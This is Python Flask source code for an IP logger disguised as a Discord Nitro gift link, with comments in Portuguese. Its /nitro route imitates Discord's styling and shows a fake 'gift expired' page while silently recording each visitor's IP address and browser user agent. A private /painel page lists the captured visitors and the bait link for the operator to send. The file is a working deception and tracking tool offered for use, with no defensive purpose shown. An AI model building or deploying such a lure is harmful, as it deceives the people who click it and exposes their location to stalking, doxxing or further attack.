import os
import json
from datetime import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)

LOGS_FILE = "logs.json"

def carregar_logs():
    if os.path.exists(LOGS_FILE):
        try:
            with open(LOGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return []
    return []

def salvar_log(dados):
    logs = carregar_logs()
    logs.insert(0, dados)
    with open(LOGS_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, ensure_ascii=False, indent=2)

# Template HTML idêntico ao layout de erro de Nitro do Discord
DISCORD_NITRO_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Your Gift Is Here</title>
    <style>
        body {
            background-color: #313338;
            color: #dbdee1;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background-color: #2b2d31;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
            max-width: 420px;
            width: 100%;
        }
        .nitro-img {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
        }
        h2 {
            color: #f2f3f5;
            font-size: 22px;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
            color: #949ba4;
            line-height: 20px;
            margin-bottom: 24px;
        }
        .btn {
            background-color: #5865f2;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 3px;
            cursor: pointer;
            width: 100%;
            text-decoration: none;
            display: inline-block;
            box-sizing: border-box;
        }
        .btn:hover {
            background-color: #4752c4;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Ícone genérico de presente / erro do Discord -->
        <svg class="nitro-img" viewBox="0 0 127.14 96.36" fill="#5865f2">
            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.79,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.81,11.1,105.25,105.25,0,0,0,32.25-16.15c2.63-27.23-4.53-51.37-20.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.9,53,48.71,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5.18-12.72,11.45-12.72S96.14,46,96.14,53,90.95,65.69,84.69,65.69Z"/>
        </svg>
        <h2>Gift Link Has Expired</h2>
        <p>This gift link has either been already claimed or has expired.</p>
        <a href="https://discord.com/login" class="btn">Login to Discord</a>
    </div>
</body>
</html>
"""

# Painel HTML para você ver os IPs capturados
PANEL_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Painel IP Logger</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: #fff; margin: 0; padding: 20px; }
        h1 { color: #00e676; }
        .container { max-width: 900px; margin: 0 auto; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; font-size: 14px; }
        th { background: #2a2a2a; color: #00e676; }
        tr:nth-child(even) { background: #181818; }
        .link-box { background: #000; padding: 10px; border-radius: 4px; font-family: monospace; color: #00e676; word-break: break-all; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 Painel de Captura - Discord Nitro</h1>
        <div class="card">
            <h3>Seu Link de Envio:</h3>
            <p class="link-box" id="track-link">Carregando...</p>
        </div>
        <div class="card">
            <h3>Logs Capturados</h3>
            <table>
                <thead>
                    <tr>
                        <th>Data / Hora</th>
                        <th>IP</th>
                        <th>Dispositivo / Navegador</th>
                    </tr>
                </thead>
                <tbody>
                    {% for log in logs %}
                    <tr>
                        <td>{{ log.data }}</td>
                        <td><strong>{{ log.ip }}</strong></td>
                        <td>{{ log.user_agent }}</td>
                    </tr>
                    {% else %}
                    <tr>
                        <td colspan="3" style="text-align:center;">Nenhum IP capturado ainda.</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
    <script>
        document.getElementById('track-link').innerText = window.location.origin + '/nitro/abc123xyz';
    </script>
</body>
</html>
"""

# Rota falsa do Nitro (O link que você vai mandar)
@app.route('/nitro/<path:subpath>')
def nitro_fake(subpath):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    data_hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    salvar_log({
        "ip": ip,
        "user_agent": user_agent,
        "data": data_hora
    })

    return render_template_string(DISCORD_NITRO_HTML)

# Rota do seu painel privado
@app.route('/painel')
def painel():
    logs = carregar_logs()
    return render_template_string(PANEL_HTML, logs=logs)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
